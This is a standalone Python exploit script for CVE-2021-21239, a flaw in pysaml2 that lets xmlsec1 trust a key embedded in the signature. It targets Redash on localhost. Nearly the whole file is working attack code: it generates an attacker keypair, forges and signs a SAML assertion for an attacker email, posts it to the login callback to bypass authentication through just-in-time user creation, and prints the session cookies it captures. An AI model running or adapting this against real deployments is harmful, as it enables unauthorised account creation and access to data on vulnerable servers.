#!/usr/bin/env python3
"""
CVE-2021-21239 Exploit for Redash
=======================================

This exploits the vulnerability in pysaml2 <= 6.4.1 where xmlsec1
prefers embedded RSA keys over configured certificates.

The key is that pysaml2 doesn't use the --enabled-key-data flag
when calling xmlsec1, allowing embedded keys to be used.
"""

import base64
import requests
from datetime import datetime, timezone, timedelta
import uuid
from lxml import etree
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend
import hashlib
import sys

# Target Configuration
REDASH_URL = "http://localhost:8080"
ENTITY_ID = "http://localhost:80/application/saml/redash/sso/metadata/"
ACS_URL = f"{REDASH_URL}/saml/callback?org_slug=default"

# Attack Configuration
ATTACK_EMAIL = "evil@test.com"

def generate_attack_keypair():
    """Generate RSA key pair for the attack"""
    print("[*] Generating RSA key pair for signature forgery...")
    
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    
    return private_key

def get_rsa_components(public_key):
    """Extract RSA modulus and exponent for KeyValue element"""
    public_numbers = public_key.public_numbers()
    
    modulus_bytes = public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')
    exponent_bytes = public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')
    
    modulus_b64 = base64.b64encode(modulus_bytes).decode('ascii')
    exponent_b64 = base64.b64encode(exponent_bytes).decode('ascii')
    
    return modulus_b64, exponent_b64

def create_malicious_saml_response(email, first_name, last_name, private_key):
    """
    Create a SAML response with embedded RSA key to exploit CVE-2021-21239.
    
    The vulnerability: pysaml2 uses xmlsec1 without --enabled-key-data flag,
    so xmlsec1 will prefer the embedded RSA key over the configured certificate.
    """
    
    # Generate IDs and timestamps
    assertion_id = f"_exploit_{uuid.uuid4().hex}"
    response_id = f"_response_{uuid.uuid4().hex}"
    issue_instant = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')
    not_on_or_after = (datetime.now(timezone.utc) + timedelta(hours=1)).strftime('%Y-%m-%dT%H:%M:%SZ')
    
    # Get RSA components for embedding
    public_key = private_key.public_key()
    modulus, exponent = get_rsa_components(public_key)
    
    print(f"[*] Creating forged SAML response for: {email}")
    print(f"[*] Assertion ID: {assertion_id}")
    print(f"[*] Embedding RSA key - Modulus: {modulus[:40]}...")
    
    # Build the complete SAML structure
    root = etree.Element(
        "{urn:oasis:names:tc:SAML:2.0:protocol}Response",
        nsmap={
            'saml2p': 'urn:oasis:names:tc:SAML:2.0:protocol',
            'saml2': 'urn:oasis:names:tc:SAML:2.0:assertion',
            'ds': 'http://www.w3.org/2000/09/xmldsig#'
        },
        ID=response_id,
        Version="2.0",
        IssueInstant=issue_instant,
        Destination=ACS_URL
    )
    
    # Response Issuer
    issuer = etree.SubElement(
        root,
        "{urn:oasis:names:tc:SAML:2.0:assertion}Issuer"
    )
    issuer.text = ENTITY_ID
    
    # Status
    status = etree.SubElement(root, "{urn:oasis:names:tc:SAML:2.0:protocol}Status")
    status_code = etree.SubElement(
        status,
        "{urn:oasis:names:tc:SAML:2.0:protocol}StatusCode",
        Value="urn:oasis:names:tc:SAML:2.0:status:Success"
    )
    
    # Assertion
    assertion = etree.SubElement(
        root,
        "{urn:oasis:names:tc:SAML:2.0:assertion}Assertion",
        ID=assertion_id,
        Version="2.0",
        IssueInstant=issue_instant
    )
    
    # Assertion Issuer
    assertion_issuer = etree.SubElement(
        assertion,
        "{urn:oasis:names:tc:SAML:2.0:assertion}Issuer"
    )
    assertion_issuer.text = ENTITY_ID
    
    # Subject
    subject = etree.SubElement(assertion, "{urn:oasis:names:tc:SAML:2.0:assertion}Subject")
    name_id = etree.SubElement(
        subject,
        "{urn:oasis:names:tc:SAML:2.0:assertion}NameID",
        Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress"
    )
    name_id.text = email
    
    subject_confirmation = etree.SubElement(
        subject,
        "{urn:oasis:names:tc:SAML:2.0:assertion}SubjectConfirmation",
        Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"
    )
    subject_confirmation_data = etree.SubElement(
        subject_confirmation,
        "{urn:oasis:names:tc:SAML:2.0:assertion}SubjectConfirmationData",
        NotOnOrAfter=not_on_or_after,
        Recipient=ACS_URL
    )
    
    # Conditions
    conditions = etree.SubElement(
        assertion,
        "{urn:oasis:names:tc:SAML:2.0:assertion}Conditions",
        NotBefore=issue_instant,
        NotOnOrAfter=not_on_or_after
    )
    audience_restriction = etree.SubElement(
        conditions,
        "{urn:oasis:names:tc:SAML:2.0:assertion}AudienceRestriction"
    )
    audience = etree.SubElement(
        audience_restriction,
        "{urn:oasis:names:tc:SAML:2.0:assertion}Audience"
    )
    audience.text = ENTITY_ID
    
    # AuthnStatement
    authn_statement = etree.SubElement(
        assertion,
        "{urn:oasis:names:tc:SAML:2.0:assertion}AuthnStatement",
        AuthnInstant=issue_instant
    )
    authn_context = etree.SubElement(
        authn_statement,
        "{urn:oasis:names:tc:SAML:2.0:assertion}AuthnContext"
    )
    authn_context_class_ref = etree.SubElement(
        authn_context,
        "{urn:oasis:names:tc:SAML:2.0:assertion}AuthnContextClassRef"
    )
    authn_context_class_ref.text = "urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"
    
    # AttributeStatement
    attribute_statement = etree.SubElement(
        assertion,
        "{urn:oasis:names:tc:SAML:2.0:assertion}AttributeStatement"
    )
    
    # Email attribute
    email_attribute = etree.SubElement(
        attribute_statement,
        "{urn:oasis:names:tc:SAML:2.0:assertion}Attribute",
        Name="email"
    )
    email_value = etree.SubElement(
        email_attribute,
        "{urn:oasis:names:tc:SAML:2.0:assertion}AttributeValue"
    )
    email_value.text = email
    
    # First name attribute
    first_name_attribute = etree.SubElement(
        attribute_statement,
        "{urn:oasis:names:tc:SAML:2.0:assertion}Attribute",
        Name="first_name"
    )
    first_name_value = etree.SubElement(
        first_name_attribute,
        "{urn:oasis:names:tc:SAML:2.0:assertion}AttributeValue"
    )
    first_name_value.text = first_name
    
    # Last name attribute
    last_name_attribute = etree.SubElement(
        attribute_statement,
        "{urn:oasis:names:tc:SAML:2.0:assertion}Attribute",
        Name="last_name"
    )
    last_name_value = etree.SubElement(
        last_name_attribute,
        "{urn:oasis:names:tc:SAML:2.0:assertion}AttributeValue"
    )
    last_name_value.text = last_name
    
    # Now we need to sign the assertion
    # First, create a copy to calculate digest (without signature)
    assertion_copy = etree.fromstring(etree.tostring(assertion))
    
    # Apply transforms and calculate digest
    # Remove any existing signatures (enveloped signature transform)
    for sig in assertion_copy.findall(".//{http://www.w3.org/2000/09/xmldsig#}Signature"):
        sig.getparent().remove(sig)
    
    # Canonicalize (exclusive c14n)
    canon_assertion = etree.tostring(
        assertion_copy,
        method='c14n',
        exclusive=True,
        with_comments=False
    )
    
    # Calculate SHA-256 digest
    digest = hashlib.sha256(canon_assertion).digest()
    digest_value = base64.b64encode(digest).decode('ascii')
    
    print(f"[*] Calculated digest: {digest_value[:32]}...")
    
    # Create Signature element
    signature = etree.Element("{http://www.w3.org/2000/09/xmldsig#}Signature")
    
    # SignedInfo
    signed_info = etree.SubElement(signature, "{http://www.w3.org/2000/09/xmldsig#}SignedInfo")
    
    canon_method = etree.SubElement(
        signed_info,
        "{http://www.w3.org/2000/09/xmldsig#}CanonicalizationMethod",
        Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"
    )
    
    sig_method = etree.SubElement(
        signed_info,
        "{http://www.w3.org/2000/09/xmldsig#}SignatureMethod",
        Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"
    )
    
    reference = etree.SubElement(
        signed_info,
        "{http://www.w3.org/2000/09/xmldsig#}Reference",
        URI=f"#{assertion_id}"
    )
    
    transforms = etree.SubElement(reference, "{http://www.w3.org/2000/09/xmldsig#}Transforms")
    
    transform1 = etree.SubElement(
        transforms,
        "{http://www.w3.org/2000/09/xmldsig#}Transform",
        Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"
    )
    
    transform2 = etree.SubElement(
        transforms,
        "{http://www.w3.org/2000/09/xmldsig#}Transform",
        Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"
    )
    
    digest_method = etree.SubElement(
        reference,
        "{http://www.w3.org/2000/09/xmldsig#}DigestMethod",
        Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"
    )
    
    digest_value_elem = etree.SubElement(reference, "{http://www.w3.org/2000/09/xmldsig#}DigestValue")
    digest_value_elem.text = digest_value
    
    # Calculate signature over SignedInfo
    canon_signed_info = etree.tostring(
        signed_info,
        method='c14n',
        exclusive=True,
        with_comments=False
    )
    
    signature_value = private_key.sign(
        canon_signed_info,
        padding.PKCS1v15(),
        hashes.SHA256()
    )
    
    sig_value_elem = etree.SubElement(signature, "{http://www.w3.org/2000/09/xmldsig#}SignatureValue")
    sig_value_elem.text = base64.b64encode(signature_value).decode('ascii')
    
    # THE CRITICAL PART: Add KeyInfo with embedded RSA key
    # This is what triggers CVE-2021-21239
    key_info = etree.SubElement(signature, "{http://www.w3.org/2000/09/xmldsig#}KeyInfo")
    key_value = etree.SubElement(key_info, "{http://www.w3.org/2000/09/xmldsig#}KeyValue")
    rsa_key_value = etree.SubElement(key_value, "{http://www.w3.org/2000/09/xmldsig#}RSAKeyValue")
    
    modulus_elem = etree.SubElement(rsa_key_value, "{http://www.w3.org/2000/09/xmldsig#}Modulus")
    modulus_elem.text = modulus
    
    exponent_elem = etree.SubElement(rsa_key_value, "{http://www.w3.org/2000/09/xmldsig#}Exponent")
    exponent_elem.text = exponent
    
    print("[+] Embedded malicious RSA key in KeyInfo/KeyValue")
    
    # Insert signature after issuer in assertion
    assertion.insert(1, signature)
    
    # Convert to string with XML declaration
    xml_bytes = etree.tostring(root, encoding='UTF-8', pretty_print=True, xml_declaration=True)
    return xml_bytes.decode('utf-8')

def send_attack(saml_response):
    """Send the forged SAML response"""
    
    # Save for debugging
    with open('exploit_saml.xml', 'w') as f:
        f.write(saml_response)
    print("[*] Saved exploit payload to: exploit_saml.xml")
    
    # Base64 encode
    saml_b64 = base64.b64encode(saml_response.encode()).decode()
    
    print(f"\n[*] Sending forged SAML response to: {ACS_URL}")
    
    try:
        response = requests.post(
            ACS_URL,
            data={'SAMLResponse': saml_b64},
            allow_redirects=False,
            timeout=10
        )
        
        print(f"[*] Response Status: {response.status_code}")
        
        if response.status_code == 302:
            location = response.headers.get('Location', '')
            print(f"[*] Redirect Location: {location}")
            
            if '/login' not in location.lower():
                print("\n[+] CVE-2021-21239 EXPLOIT SUCCESSFUL!")
                print("[+] xmlsec1 used the embedded RSA key instead of configured cert!")
                print(f"[+] User '{ATTACK_EMAIL}' created via JIT provisioning")
                
                # Get cookies
                if response.cookies:
                    print("\n[+] Session cookies obtained:")
                    for cookie in response.cookies:
                        print(f"    {cookie.name} = {cookie.value[:40]}...")
                
                return True
            else:
                print("\n[-] Redirected to login - attack failed")
        else:
            print(f"\n[-] Unexpected response: {response.status_code}")
            if response.text:
                print(f"Response preview: {response.text[:300]}...")
        
        return False
        
    except Exception as e:
        print(f"\n[-] Error: {e}")
        return False

def main():
    print("""
╔══════════════════════════════════════════════════════════════════╗
║                CVE-2021-21239 Redash Exploit                     ║
║                                                                  ║
║  Vulnerability: xmlsec1 prefers embedded RSA keys                ║
║  Affected: pysaml2 <= 6.4.1                                      ║
║  Impact: SAML authentication bypass                              ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    
    print(f"[*] Target: {REDASH_URL}")
    print(f"[*] Entity ID: {ENTITY_ID}")
    print(f"[*] ACS URL: {ACS_URL}")
    
    # Generate attack keypair
    private_key = generate_attack_keypair()
    
    # Create malicious SAML response
    print("\n[*] Creating malicious SAML response with CVE-2021-21239 exploit...")
    
    malicious_saml = create_malicious_saml_response(
        email=ATTACK_EMAIL,
        first_name="Evil",
        last_name="Attacker",
        private_key=private_key
    )
    
    # Send attack
    send_attack(malicious_saml)

if __name__ == "__main__":
    main()
